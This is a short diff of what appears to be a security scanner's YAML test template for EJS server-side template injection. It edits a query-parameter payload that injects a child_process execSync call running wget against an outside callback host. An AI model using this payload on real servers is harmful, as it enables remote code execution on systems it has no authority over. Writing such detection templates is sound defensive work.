@@ -40,7 +40,7 @@ execute:
       - add_query_param:
           id: "abcdefgh"
       - add_query_param:
-          !!str settings[view%20options][outputFunctionName]: "x;process.mainModule.require(%27child_process%27).execSync(%27wget+https://test-services.akto.io/store_uuid/${random_uuid}%27);s"
+          !!str settings[view%20options][outputFunctionName]: "x;process.mainModule.require(%27child_process%27).execSync(%27wget+https://test-services.akto.io/${random_uuid}%27);s"
       
 validate:
   response_code:
